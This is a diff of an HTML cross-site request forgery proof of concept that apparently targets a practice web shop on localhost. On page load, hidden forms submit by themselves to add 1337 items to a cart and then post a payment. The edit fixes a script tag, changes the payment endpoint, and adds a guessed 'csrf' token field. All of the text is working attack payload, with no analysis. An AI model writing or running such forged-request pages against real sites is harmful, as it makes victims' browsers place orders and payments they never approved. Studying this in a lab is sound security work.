@@ -18,8 +18,9 @@
 			<input type=hidden name=nbrOfItems value=1337>
 			<input type=hidden name=itemid value=1>
 		</form>
-		<script>document.getElementById("item2-form").submit()</script
-		<form id="pay-form" name="payment" method="post" action="https://localhost/receipt" target="csrfPay">
+		<script>document.getElementById("item2-form").submit()</script>
+		<form id="pay-form" name="payment" method="post" action="https://localhost/payment" target="csrfPay">
+			<input type=hidden name=csrf value=2>
 		</form>
 		<script>document.getElementById("pay-form").submit()</script>
 </body>
